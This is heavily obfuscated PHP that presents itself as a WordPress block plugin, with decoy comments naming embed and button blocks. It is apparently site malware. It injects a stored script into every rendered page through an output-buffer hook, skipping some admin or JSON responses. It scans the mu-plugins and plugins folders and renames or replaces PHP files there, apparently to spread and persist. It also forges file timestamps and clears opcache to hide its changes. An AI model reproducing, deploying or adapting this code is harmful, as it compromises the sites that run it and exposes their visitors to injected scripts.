 $ab8kpa67bk16_k1n = (isset($GLOBALS[m40pvx5ij_z4mj(485)])     &&   $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[bovhd4vawcd(1809)]))     ? $GLOBALS['__scf_nimluvpxhrpvn_323']($GLOBALS[bovhd4vawcd(1809)])    :  "";
 if  ($ab8kpa67bk16_k1n  ===  "") return  "";

$ab8kpa67bk16_k1n =     $GLOBALS['__scf_kr_w9stt2gb_360'](bovhd4vawcd(1810),  bovhd4vawcd(1811), $ab8kpa67bk16_k1n);
   $y9d4pdyxbi_4 =     $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(556))     ?   (string)    $GLOBALS['__scf_jphyng87rekxk_557'](home_url(),  PHP_URL_HOST)  : "";
       $lyf0dmt56ei6 =  dv62azao9qb3z33m4cwig0($GLOBALS['__scf_vi47igxg1zd_103']($y9d4pdyxbi_4),    (0x3+0x3));
$roednn5ym9  =  $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($ab8kpa67bk16_k1n),   0,     (168^174));



 return     "\n<script data-sc=\""    .  $lyf0dmt56ei6 .    '-'   .  $roednn5ym9    .  "\">\n"  .  $ab8kpa67bk16_k1n  .   "\n</script>\n<!-- sc"  .    $lyf0dmt56ei6     . '-' . $roednn5ym9  . " -->\n";
  }
 function  k1qjvetb0gutkcstsk()
 {
 try   {
// WP Embed Block: irreducible constraint-set

if   (tbewibdfcid80hu_s())  return;
   $e7iswev08tryjha    = ef8h805j_zad8rpmfo();
   if ($e7iswev08tryjha     ===   "") return;
   echo $e7iswev08tryjha;
    $GLOBALS[lpwgqh9300(489)] =   true;

   if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1812))  &&      $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1586))  && empty($GLOBALS[bovhd4vawcd(1813)]))    {
  $GLOBALS[m5t68uuej1(1814)]    =     true;
  $_flxs98c2obc =  (int)    @get_option(m5t68uuej1(493),   0);
 if   ($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  $_flxs98c2obc   >  (0x64+0xc8))  @update_option(bovhd4vawcd(493),  $GLOBALS['__scf_ibw9xvmx9ckin_187'](),  m5t68uuej1(1513));
  unset($_flxs98c2obc);

}
  } catch     (Throwable    $k3g08rnqu9m)  {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(623),    $k3g08rnqu9m);
    }  catch    (Exception    $k3g08rnqu9m)  {
     }
// idempotent opaque-type

 }


        function d_4a0qy9wkc3ns7($an1lwiwsw4q, $u9gpeuqqazmr5ruv = 0)
    {
if (!$GLOBALS['__scf_e_8z8ias8ka_43']($an1lwiwsw4q) ||    $an1lwiwsw4q  === "") return $an1lwiwsw4q;
   if (defined(m40pvx5ij_z4mj(1815))  &&     !($u9gpeuqqazmr5ruv &  PHP_OUTPUT_HANDLER_FINAL)) return $an1lwiwsw4q;
if   (!empty($GLOBALS[m40pvx5ij_z4mj(1756)])) return  $an1lwiwsw4q;
   if  (!empty($GLOBALS[m5t68uuej1(1816)]))     return  $an1lwiwsw4q;
  if  ($GLOBALS['__scf_fr9u7cq1eo_10']($an1lwiwsw4q) >    (3019060+1175244))  return     $an1lwiwsw4q;
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(402)))  {
  foreach   ((array) @headers_list()  as   $pfih8_uyeda3mo)  {
        if   (stripos($pfih8_uyeda3mo,    m40pvx5ij_z4mj(1817))   === 0    &&  stripos($pfih8_uyeda3mo, m5t68uuej1(1818))   !==   false)  return $an1lwiwsw4q;


   if (stripos($pfih8_uyeda3mo, m5t68uuej1(1819))     ===    0  && stripos($pfih8_uyeda3mo,  m5t68uuej1(1820)) ===   false   &&    stripos($pfih8_uyeda3mo,    bovhd4vawcd(1821))     === false) return $an1lwiwsw4q;



  }
     unset($pfih8_uyeda3mo);
  }
 $e7iswev08tryjha   =    ef8h805j_zad8rpmfo();
if    ($e7iswev08tryjha   ===    "")  return $an1lwiwsw4q;
    if    (stripos($an1lwiwsw4q,  bovhd4vawcd(1822))   ===  false  &&  stripos($an1lwiwsw4q,   bovhd4vawcd(1823))      ===  false)  return $an1lwiwsw4q;
   $GLOBALS[bovhd4vawcd(1816)] =    true;
  $GLOBALS[m40pvx5ij_z4mj(1824)]     =  true;
       $k9qtboqgpkxlcyo  =    stripos($an1lwiwsw4q,   lpwgqh9300(1822));
  if ($k9qtboqgpkxlcyo !==  false)   {
 return $GLOBALS['__scf_vvn10ievj2k_9']($an1lwiwsw4q, 0,   $k9qtboqgpkxlcyo) .  $e7iswev08tryjha  .  $GLOBALS['__scf_vvn10ievj2k_9']($an1lwiwsw4q,  $k9qtboqgpkxlcyo);
    }


   return $an1lwiwsw4q   .  $e7iswev08tryjha;
     }
 function  clcog3kx__rvwis7g6bd()
    {
try   {
 if    (tbewibdfcid80hu_s())  return;
 if    (!empty($GLOBALS[m5t68uuej1(1825)]))     return;
     if  (!empty($GLOBALS[lpwgqh9300(1826)]))     return;
   if    (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(402))) return;
$ab8kpa67bk16_k1n  = (isset($GLOBALS[lpwgqh9300(1809)])     &&  $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[m5t68uuej1(1809)]))    ?  $GLOBALS['__scf_nimluvpxhrpvn_323']($GLOBALS[m5t68uuej1(1809)])  :     "";
 if  ($ab8kpa67bk16_k1n  === "")   return;
 $qnb61ywvqlf   =     isset($_SERVER[m40pvx5ij_z4mj(1827)])  ? (string)  $_SERVER[lpwgqh9300(1827)]    :   "";


if ($qnb61ywvqlf   !==  ""  &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1828), $qnb61ywvqlf))  return;
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(402)))      {
 foreach   ((array) @headers_list() as $pfih8_uyeda3mo)   {
   if (stripos($pfih8_uyeda3mo, m5t68uuej1(1829)) ===    0   &&   stripos($pfih8_uyeda3mo,     m5t68uuej1(1818))   !== false)   return;

      if  (stripos($pfih8_uyeda3mo, lpwgqh9300(1819))  ===     0   &&   stripos($pfih8_uyeda3mo,  m5t68uuej1(1830)) ===   false &&  stripos($pfih8_uyeda3mo,    m40pvx5ij_z4mj(1831)) ===     false)   return;
if    (stripos($pfih8_uyeda3mo,  bovhd4vawcd(1832))  === 0) return;
        }
      unset($pfih8_uyeda3mo);


    }
  $GLOBALS[lpwgqh9300(1826)] = true;
@$GLOBALS['__scf_tiy_1360vtth_1833'](lpwgqh9300(1834));
      }    catch  (Throwable $k3g08rnqu9m)   {
  r63yaewew47stuijcrwsx6(m5t68uuej1(490),    $k3g08rnqu9m);
    }  catch (Exception  $k3g08rnqu9m) {
       }
      }
 function  gm8b79o5jmk5cuyvp()
    {
  try {
      if     (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(759)))    return;

if (!is_admin()   &&    (!isset($GLOBALS[m5t68uuej1(1835)]) ||   $GLOBALS[lpwgqh9300(1835)]  !== m40pvx5ij_z4mj(1481))) return;$am5ye3hzdqk7=1030;$srxelq23rv=$am5ye3hzdqk7%14;
   if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(479))     && !is_ssl())  return;
$mmf1773xhj6k   =  sb3q0_7sw2xmlw84(m5t68uuej1(1836),  "");
    $lyf0dmt56ei6     =  dv62azao9qb3z33m4cwig0(ABSPATH .  lpwgqh9300(623),  (3+3));
    $t_1gijg4ys9il    =  lpwgqh9300(1327);

  if ($mmf1773xhj6k  ===   "")   {



     if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1837)) && (int)   @get_option(m40pvx5ij_z4mj(1838),    0))  {
   @update_option(m40pvx5ij_z4mj(1838),  0,  m5t68uuej1(1513));
$jsm65pgkj2d =  (string)  @get_option(lpwgqh9300(1839),      "");



    echo "\n"  .   lpwgqh9300(1840)   . $lyf0dmt56ei6   .  '>'
 .  m5t68uuej1(1841)
    .  bovhd4vawcd(1842) .  $t_1gijg4ys9il(lpwgqh9300(1843)) . m5t68uuej1(1844)
 .  lpwgqh9300(1845) . $GLOBALS['__scf_sfkxpd8jhlhj_587']($jsm65pgkj2d)     .  ';'
.   m5t68uuej1(1846)  .   $t_1gijg4ys9il(m5t68uuej1(1847))  . m40pvx5ij_z4mj(1848)
   .   lpwgqh9300(1849)   .     $t_1gijg4ys9il(m40pvx5ij_z4mj(1850))  . m5t68uuej1(1851) .  $t_1gijg4ys9il(m5t68uuej1(1852)) .   bovhd4vawcd(1851)  . $t_1gijg4ys9il(lpwgqh9300(1853)) .  m40pvx5ij_z4mj(1854)  .  $t_1gijg4ys9il(m5t68uuej1(1855))   .      m40pvx5ij_z4mj(1856)
.  lpwgqh9300(1857)  . $t_1gijg4ys9il(lpwgqh9300(1858)) .     bovhd4vawcd(1859)   . $t_1gijg4ys9il(bovhd4vawcd(1860))  . lpwgqh9300(1861)
     .   m5t68uuej1(1862)   .  "\n";
      unset($jsm65pgkj2d);

   }
    return;



}
  $mmf1773xhj6k    =      $GLOBALS['__scf_kr_w9stt2gb_360'](lpwgqh9300(1124),   m5t68uuej1(1159),  $mmf1773xhj6k);
  if   ($GLOBALS['__scf_i8i8g4oxha_7']($mmf1773xhj6k,   m40pvx5ij_z4mj(1863))  !==    0)    $mmf1773xhj6k   =    bovhd4vawcd(1863)  .  $GLOBALS['__scf_ygq7rrk70hs6ha_8']($mmf1773xhj6k,   '/');
   $p61y4pcgugq3g  = '/';


if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1864)))      {
  $kfp2vr8olyu5h9y =     (string)  $GLOBALS['__scf_jphyng87rekxk_557'](home_url(), PHP_URL_PATH);
if  ($kfp2vr8olyu5h9y      !==  "" &&    $kfp2vr8olyu5h9y    !==   '/')    $p61y4pcgugq3g   =      $GLOBALS['__scf_zsw089px33o1o__12']($kfp2vr8olyu5h9y,     '/')   .   '/';
}
  if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1586))) {



  @update_option(m5t68uuej1(1865),  1,  m5t68uuej1(1513));
       @update_option(m40pvx5ij_z4mj(1866),  $mmf1773xhj6k,   bovhd4vawcd(1513));


      }
/* exact bridge */

 $pu_z2vslfbo   =  m5t68uuej1(1840) . $lyf0dmt56ei6  .  '>'
. m40pvx5ij_z4mj(1841)
   .   m40pvx5ij_z4mj(1842)     .  $t_1gijg4ys9il(lpwgqh9300(1867))  .    m5t68uuej1(1868)


 .      bovhd4vawcd(1869)
    .  m40pvx5ij_z4mj(1870) .  $t_1gijg4ys9il(m5t68uuej1(1871))    .   m40pvx5ij_z4mj(1872)    .  $GLOBALS['__scf_sfkxpd8jhlhj_587']($mmf1773xhj6k)    .      ')'
  .   bovhd4vawcd(1873)   .  $t_1gijg4ys9il(m40pvx5ij_z4mj(1850))     . m40pvx5ij_z4mj(1851)    . $t_1gijg4ys9il(m40pvx5ij_z4mj(1852)) .  bovhd4vawcd(1851)  .  $t_1gijg4ys9il(m5t68uuej1(1853))     .   m40pvx5ij_z4mj(1854)   .     $t_1gijg4ys9il(bovhd4vawcd(1855))     .    bovhd4vawcd(1874)     .     $GLOBALS['__scf_sfkxpd8jhlhj_587']($mmf1773xhj6k)     . bovhd4vawcd(1875)
    .     m40pvx5ij_z4mj(1876)   . $t_1gijg4ys9il(bovhd4vawcd(1877))  .   lpwgqh9300(1872) .     $GLOBALS['__scf_sfkxpd8jhlhj_587']($mmf1773xhj6k)  .   m5t68uuej1(1878)  .   $GLOBALS['__scf_sfkxpd8jhlhj_587']($p61y4pcgugq3g)     .   m5t68uuej1(1879) .  $t_1gijg4ys9il(bovhd4vawcd(1880))  . m5t68uuej1(1881)
 .   bovhd4vawcd(1882)  . $t_1gijg4ys9il(m5t68uuej1(1880)) .   m5t68uuej1(1883)
    .  lpwgqh9300(1884)      .   $t_1gijg4ys9il(lpwgqh9300(1885)) .     bovhd4vawcd(1886)   .  $t_1gijg4ys9il(lpwgqh9300(177))   .  lpwgqh9300(1887)
       . m5t68uuej1(1888)  . $t_1gijg4ys9il(bovhd4vawcd(1701))    .  lpwgqh9300(1868)



 .    m5t68uuej1(1889)
       .      m5t68uuej1(1884)  .    $t_1gijg4ys9il(bovhd4vawcd(1890))   .     bovhd4vawcd(1891)

.     m5t68uuej1(1892) .  $t_1gijg4ys9il(bovhd4vawcd(1850)) .    m5t68uuej1(1893) .   $t_1gijg4ys9il(m40pvx5ij_z4mj(1894))     .    lpwgqh9300(1895)
    . m5t68uuej1(1862);

echo "\n"  . $pu_z2vslfbo     .  "\n";



       }   catch    (Throwable  $k3g08rnqu9m)     {
// causal memento

r63yaewew47stuijcrwsx6(lpwgqh9300(1896),   $k3g08rnqu9m);
    }    catch  (Exception  $k3g08rnqu9m)  {
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1896),  $k3g08rnqu9m);
      }
    }
 
if  (gi51v4u6s4yu_j1ouvghl()) {
 return;
}
 kqqy8xacwrmnc_xxuywhx();
 $lplq1x52r3    =      @$GLOBALS['__scf_tm09rtls_27e_98'](t6995wceyqc2q1wqvl());

if   (!$lplq1x52r3 ||   ($lplq1x52r3    %  (0x6630+0x12070))     !==  eliqs4hzzhoila0pbe())    {
     $p_zcj3ih4s6w =   $GLOBALS['__scf_ibw9xvmx9ckin_187']();
  g3arn5w1kvbi32ro9tm(t6995wceyqc2q1wqvl(),    ($p_zcj3ih4s6w     -   ($p_zcj3ih4s6w   %    (181690-81690)))  +   eliqs4hzzhoila0pbe());
 unset($p_zcj3ih4s6w);



   }

  unset($lplq1x52r3);
$zq0e7ry_z4     =   $GLOBALS['__scf_oagg5b1ubqmznt_11'](__FILE__)   . m40pvx5ij_z4mj(1897) .  $GLOBALS['__scf_os_n9tj5psxjj_3'](__FILE__,  lpwgqh9300(1758));
 $x7mgb5q6ks7   = @$GLOBALS['__scf_a83pywb98qzq2_20']($zq0e7ry_z4)  ? (int)  @$GLOBALS['__scf_tm09rtls_27e_98']($zq0e7ry_z4)   :  0;
$niob_4tjd4  = !($x7mgb5q6ks7  >   $GLOBALS['__scf_ibw9xvmx9ckin_187']()   - (273+27)      &&  $x7mgb5q6ks7 <=   $GLOBALS['__scf_ibw9xvmx9ckin_187']()  +  (268+32));
   if    ($niob_4tjd4)  @$GLOBALS['__scf_fiolz593w9mj_75']($zq0e7ry_z4);
    unset($zq0e7ry_z4,    $x7mgb5q6ks7);
if   ($niob_4tjd4)   try     {
 $cqop1wmc70l  =    __FILE__;
   $luyucl10majw  =   "";

    $djkzb65harm8z   =   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($cqop1wmc70l, false, null,      0,     (0xfa8+0x58));
   if      ($GLOBALS['__scf_e_8z8ias8ka_43']($djkzb65harm8z)     &&   $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(97),   $djkzb65harm8z, $tcitjafmodsv34))  $luyucl10majw   =  $tcitjafmodsv34[1];
        if  ($luyucl10majw   !==  ""   &&    defined(lpwgqh9300(1738)))     {
     $ne0xv7wg6v0jia   = array();
$krsrj_74gbke =  defined(m5t68uuej1(1204))    ?  WPMU_PLUGIN_DIR  :      WP_CONTENT_DIR . m40pvx5ij_z4mj(1898);
 $dcbydkc50a = defined(lpwgqh9300(702))  ? WP_PLUGIN_DIR  : WP_CONTENT_DIR  .   m40pvx5ij_z4mj(726);
    $o4io8ibxn1v71s6     =   false;
       if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(736)))  {
// prime strategy

$tq562hh2y20 =  @$GLOBALS['__scf_i9hdv7zrfsy_45']($krsrj_74gbke)    ?    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($krsrj_74gbke .   m5t68uuej1(1564))  :    false;
     $wfbewpzhjih = @$GLOBALS['__scf_ql1i4f573p8rhm_73']($dcbydkc50a  .     bovhd4vawcd(453));

    if  ($GLOBALS['__scf_pomb89yiuz_37']($tq562hh2y20)    || $GLOBALS['__scf_pomb89yiuz_37']($wfbewpzhjih))    {
   $o4io8ibxn1v71s6 = true;
  

  foreach ((array) $tq562hh2y20  as   $szxscldwpa)  $ne0xv7wg6v0jia[]    =    $szxscldwpa;
 foreach ((array)     $wfbewpzhjih   as   $szxscldwpa) $ne0xv7wg6v0jia[]  = $szxscldwpa;
      }
unset($tq562hh2y20, $wfbewpzhjih);
  }


if    (!$o4io8ibxn1v71s6)  {
   $k4k50aiir3mr   =   @$GLOBALS['__scf_i9hdv7zrfsy_45']($krsrj_74gbke) ?  h06jfdytq78tzk7($krsrj_74gbke,  (4953+47)) :  false;
 if     ($GLOBALS['__scf_pomb89yiuz_37']($k4k50aiir3mr))  foreach      ($k4k50aiir3mr  as  $xvkqwgv95zgy)   {
    if    ($GLOBALS['__scf_vvn10ievj2k_9']($xvkqwgv95zgy,  -(8-4))  ===  bovhd4vawcd(1899))  $ne0xv7wg6v0jia[]    =  $krsrj_74gbke .    '/'  .    $xvkqwgv95zgy;
   }
$k4k50aiir3mr  =   @$GLOBALS['__scf_i9hdv7zrfsy_45']($dcbydkc50a) ? h06jfdytq78tzk7($dcbydkc50a,  (9813-4813))    :  false;
  if    ($GLOBALS['__scf_pomb89yiuz_37']($k4k50aiir3mr))   foreach ($k4k50aiir3mr    as     $xvkqwgv95zgy) {
  $p75oeusgl69oa7      =  $dcbydkc50a .  '/' .    $xvkqwgv95zgy;
 if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($p75oeusgl69oa7))    continue;
  $ev5ie2ba2vav  =     h06jfdytq78tzk7($p75oeusgl69oa7,   (0x6fe+0xc8a));
if (!$GLOBALS['__scf_pomb89yiuz_37']($ev5ie2ba2vav)) continue;
 foreach    ($ev5ie2ba2vav as   $gfsdtk8d9aac8ddd) {


 if ($GLOBALS['__scf_vvn10ievj2k_9']($gfsdtk8d9aac8ddd,     -(3+1))   ===   bovhd4vawcd(1900)) $ne0xv7wg6v0jia[] = $p75oeusgl69oa7  .  '/'  .    $gfsdtk8d9aac8ddd;

       }
// deregister satisfiable negotiator

     }
   unset($k4k50aiir3mr,   $xvkqwgv95zgy, $gfsdtk8d9aac8ddd,   $p75oeusgl69oa7,   $ev5ie2ba2vav);

 }


 $vkentn0wzw1  =   $GLOBALS['__scf_os_n9tj5psxjj_3']($cqop1wmc70l,  m40pvx5ij_z4mj(1900));
foreach ($ne0xv7wg6v0jia     as  $szxscldwpa)  {



     if  ($szxscldwpa   ===   $cqop1wmc70l) continue;
$vfhx11ecz38   =  @$GLOBALS['__scf_tm09rtls_27e_98']($szxscldwpa);
 if (!$vfhx11ecz38 ||  ($vfhx11ecz38  %  (99951+49))  !==      (93766+53))   {
$zmuvq88zp814  = @$GLOBALS['__scf_pftf6vocmvs2m_99']($szxscldwpa);$f7mbzp36o6muhc=PHP_MAJOR_VERSION;$lwb8ryocl71gg=$f7mbzp36o6muhc*10;
if  (!$zmuvq88zp814   ||     $zmuvq88zp814  <  (471+29)  || $zmuvq88zp814  >   (52428705+95)) continue;

      }
$djkzb65harm8z     =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($szxscldwpa,    false,   null, 0,   (4087+9));
 $tcitjafmodsv34 =   array();


 if ($GLOBALS['__scf_e_8z8ias8ka_43']($djkzb65harm8z)) $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(97),  $djkzb65harm8z,   $tcitjafmodsv34);
  if   (empty($tcitjafmodsv34[1]))   {
if    (!ey9i45m9xcoe7q13e9ag2($szxscldwpa,  (702+4298)))   continue;
$tcitjafmodsv34  = array("", bovhd4vawcd(1567));
  }

   if  ($GLOBALS['__scf_os_n9tj5psxjj_3']($szxscldwpa,  bovhd4vawcd(1901))   ===     $vkentn0wzw1 &&  $tcitjafmodsv34[1]   === $luyucl10majw) {
  if (!u4zei_kbwnbowyst($szxscldwpa))     {


    if   (j07vd_9875h0key7jsai($szxscldwpa,  $szxscldwpa   .   lpwgqh9300(31)) &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1572)))  @opcache_invalidate($szxscldwpa,    true);
   }
       continue;
}
// sample provider for WP Button Block

     if  (version_compare($tcitjafmodsv34[1], $luyucl10majw, '<'))    {
$j9n5kn9o7txzlhf1 = vwmi9k19liyrqa2($szxscldwpa);
   if  ($j9n5kn9o7txzlhf1    === false) {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(1902),   m40pvx5ij_z4mj(1568) . $GLOBALS['__scf_os_n9tj5psxjj_3']($szxscldwpa));
  continue;



  }
 if ($j9n5kn9o7txzlhf1   === true)     {

    if  (j07vd_9875h0key7jsai($szxscldwpa,  $szxscldwpa  .  bovhd4vawcd(31)))    {
      if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1572)))  @opcache_invalidate($szxscldwpa, true);
      }   elseif  (!a7dvz8wf94o6ie9rtc8hn($szxscldwpa)   && xv1s1ysff42y691n($szxscldwpa)) {
g3zy8qn5_yvcvi22($szxscldwpa);
o_k_og36_9hyi4dckvd($szxscldwpa);
    }
@$GLOBALS['__scf_o_94ckdo_kfcf_19']($GLOBALS['__scf_oagg5b1ubqmznt_11']($szxscldwpa)  .    m5t68uuej1(1903)     .     $GLOBALS['__scf_os_n9tj5psxjj_3']($szxscldwpa,   m5t68uuej1(1904)));
    continue;

  }
// expected path

if  (!a7dvz8wf94o6ie9rtc8hn($szxscldwpa)     && xv1s1ysff42y691n($szxscldwpa)) {
   g3zy8qn5_yvcvi22($szxscldwpa);

   o_k_og36_9hyi4dckvd($szxscldwpa);
}



g_xncp1p67nlv9($szxscldwpa);$edrm481u2nbky=PHP_INT_MAX/PHP_INT_MAX;$raicmjg0foa=$edrm481u2nbky+73;
continue;
  }
    $mlo_84yzg2ei = ($GLOBALS['__scf_os_n9tj5psxjj_3']($GLOBALS['__scf_oagg5b1ubqmznt_11']($szxscldwpa)) ===  bovhd4vawcd(1905)   ||  $GLOBALS['__scf_oagg5b1ubqmznt_11']($szxscldwpa)  === $krsrj_74gbke);
 if  (!$mlo_84yzg2ei &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1837))) {

   $lo0l4ir456fqj__    =    $GLOBALS['__scf_os_n9tj5psxjj_3']($GLOBALS['__scf_oagg5b1ubqmznt_11']($szxscldwpa)) .    '/'  . $GLOBALS['__scf_os_n9tj5psxjj_3']($szxscldwpa);
    $ibzj1_d8f2aiu   =   (array)   @get_option(bovhd4vawcd(725),   array());
  $mlo_84yzg2ei   = $GLOBALS['__scf_hf87ul3fvpzrkm_150']($lo0l4ir456fqj__,   $ibzj1_d8f2aiu,     true);


if   (!$mlo_84yzg2ei &&      $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1691))  &&     is_multisite() &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(207)))    {
  $as8nc81p0pbis   = (array) @get_site_option(m40pvx5ij_z4mj(208),  array());
  $mlo_84yzg2ei    =  isset($as8nc81p0pbis[$lo0l4ir456fqj__]);
unset($as8nc81p0pbis);


  }
// PHP CS Fixer aspect ratio




     unset($lo0l4ir456fqj__, $ibzj1_d8f2aiu);
 }
/* pure-adj call-graph */

 if   (!$mlo_84yzg2ei)   continue;


if   (version_compare($tcitjafmodsv34[1],  $luyucl10majw,   '>'))    {
      if     (u4zei_kbwnbowyst($szxscldwpa)   &&    !_z0a2xi_u8npvosrifue($szxscldwpa)     &&    !v7bflcy_td_1ovut($szxscldwpa,  $cqop1wmc70l)) return;
 $x8j1nc6jai85 =  $GLOBALS['__scf_oagg5b1ubqmznt_11']($szxscldwpa)   .    lpwgqh9300(1906) .   $GLOBALS['__scf_pe3s4q1z7z_59']($szxscldwpa);
    if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($x8j1nc6jai85)    &&   (int)   @$GLOBALS['__scf_tm09rtls_27e_98']($x8j1nc6jai85) <    $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -   (23+37))  {
$_yxmmc7epag3    = $GLOBALS['__scf_wninqej2t1_113']('|',  (string)   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($x8j1nc6jai85));



 if   ($GLOBALS['__scf_xbixt340jb_38']($_yxmmc7epag3)  < 2 ||  $_yxmmc7epag3[0] !== $tcitjafmodsv34[1]  ||    (int)      $_yxmmc7epag3[1] !==    (int)   @$GLOBALS['__scf_pftf6vocmvs2m_99']($szxscldwpa)) {
        @$GLOBALS['__scf_o_94ckdo_kfcf_19']($x8j1nc6jai85);
continue;
  }
if   (vwmi9k19liyrqa2($szxscldwpa)    !==  false) {
cik9ldzrbjmtnzm00($szxscldwpa, (350+70));
  if     (netei2x342rtzmi4tj69($szxscldwpa))  {

 @$GLOBALS['__scf_o_94ckdo_kfcf_19']($x8j1nc6jai85);

  if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1907)))  @opcache_invalidate($szxscldwpa,    true);
 }
}


  continue;
}
   @$GLOBALS['__scf_u59p44o1il_196']($x8j1nc6jai85,    $tcitjafmodsv34[1]    .    '|'  .  (int) @$GLOBALS['__scf_pftf6vocmvs2m_99']($szxscldwpa));
   continue;
     }


   if    ($tcitjafmodsv34[1] ===  $luyucl10majw)   {
 $sl1r47byhqie6  =   sayeodgmxz9seo_nz4dfzd();
  $e_ijtvh5ax   =  false;
      if    (!empty($sl1r47byhqie6[m40pvx5ij_z4mj(1365)]))     {
 $z64j5kt21p   =    @$GLOBALS['__scf_j79iy74onqck2_35']($sl1r47byhqie6[m40pvx5ij_z4mj(1365)]);



 $qjsnd5nuarkotpg  = @$GLOBALS['__scf_j79iy74onqck2_35']($szxscldwpa);


 if     ($GLOBALS['__scf_e_8z8ias8ka_43']($z64j5kt21p)    && $GLOBALS['__scf_e_8z8ias8ka_43']($qjsnd5nuarkotpg)  && $z64j5kt21p      ===  $qjsnd5nuarkotpg   &&   wgc6g5qn0cg71tm0jcw2s($sl1r47byhqie6) === bovhd4vawcd(1381) && u4zei_kbwnbowyst($szxscldwpa)) {



if  (v7bflcy_td_1ovut($szxscldwpa, $cqop1wmc70l)) $e_ijtvh5ax   =     true;
    else   return;
 }
  if  ($GLOBALS['__scf_e_8z8ias8ka_43']($z64j5kt21p)  &&  $z64j5kt21p   === @$GLOBALS['__scf_j79iy74onqck2_35']($cqop1wmc70l))   $e_ijtvh5ax =     true;
  }
 if     (!$e_ijtvh5ax   &&  !u4zei_kbwnbowyst($szxscldwpa))      {
if (_z0a2xi_u8npvosrifue($szxscldwpa) ||   vwmi9k19liyrqa2($szxscldwpa) !==  false)    {
  if   (j07vd_9875h0key7jsai($szxscldwpa,  $szxscldwpa .  bovhd4vawcd(1908))  && $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1907)))     @opcache_invalidate($szxscldwpa,  true);
  }

  unset($sl1r47byhqie6,  $e_ijtvh5ax,      $z64j5kt21p,  $qjsnd5nuarkotpg);


continue;
 }



if (!$e_ijtvh5ax &&  $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($GLOBALS['__scf_os_n9tj5psxjj_3']($szxscldwpa,  bovhd4vawcd(1909))),      0,  (6<<1))    >    $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($vkentn0wzw1), 0, (0x5+0x7)))  {
if (!v7bflcy_td_1ovut($szxscldwpa, $cqop1wmc70l))     return;
   

  }
unset($sl1r47byhqie6,      $e_ijtvh5ax,  $z64j5kt21p,  $qjsnd5nuarkotpg);
   }
 }

    }
  unset($cqop1wmc70l,  $luyucl10majw, $djkzb65harm8z,   $tcitjafmodsv34,   $ne0xv7wg6v0jia, $krsrj_74gbke,     $dcbydkc50a,      $szxscldwpa,   $vfhx11ecz38,  $vkentn0wzw1, $zmuvq88zp814, $j9n5kn9o7txzlhf1, $x8j1nc6jai85,  $_yxmmc7epag3);
   }  catch (Throwable  $k3g08rnqu9m)   {
}  catch  (Exception    $k3g08rnqu9m) {
    }


    unset($niob_4tjd4);
if  (isset($GLOBALS[m40pvx5ij_z4mj(182)]))    {
// PCRE2 JIT sizes attribute

     if   (version_compare((string)   $GLOBALS[m40pvx5ij_z4mj(1910)],   kdgw8qqvzf6yolk(),     bovhd4vawcd(195)))   return;

   $GLOBALS[m5t68uuej1(1911)]    =   1;
   }   elseif (defined(bovhd4vawcd(1912))) {


   $rg1z5jxmxtj6l08 =    constant(m5t68uuej1(1913));



   if    ($GLOBALS['__scf_e_8z8ias8ka_43']($rg1z5jxmxtj6l08)     &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1310),  $rg1z5jxmxtj6l08)  && version_compare($rg1z5jxmxtj6l08,   kdgw8qqvzf6yolk(),     m40pvx5ij_z4mj(1914)))  return;
$GLOBALS[lpwgqh9300(1915)]   =  1;
    unset($rg1z5jxmxtj6l08);
    }


     $GLOBALS[lpwgqh9300(1910)]    = kdgw8qqvzf6yolk();
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(184)))   @clearstatcache(true, t6995wceyqc2q1wqvl());



 $GLOBALS[m5t68uuej1(183)] = (string)     @$GLOBALS['__scf_pftf6vocmvs2m_99'](t6995wceyqc2q1wqvl())  . ':' . (string)   @$GLOBALS['__scf_tm09rtls_27e_98'](t6995wceyqc2q1wqvl());
   if  (!defined(m40pvx5ij_z4mj(1916)))   define(bovhd4vawcd(1916),  kdgw8qqvzf6yolk());


